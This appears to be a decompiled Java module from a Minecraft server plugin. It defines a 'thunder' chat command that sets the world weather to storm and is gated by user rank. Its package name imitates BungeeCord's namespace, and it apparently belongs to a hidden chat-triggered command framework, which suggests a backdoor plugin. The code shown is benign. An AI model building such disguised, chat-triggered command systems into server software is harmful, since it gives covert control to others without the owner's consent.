package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "thunder",
   description = "Sets the weather to thunder",
   blatant = true,
   rank = Rank.LITE
)
public class ThunderCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
         var1.getPlayer().getWorld().setStorm(true);
         var1.getPlayer().getWorld().setThundering(true);
         ChatUtil.sendChat(var1.getPlayer(), "The weather has been set to thunder.");
      });
   }
}
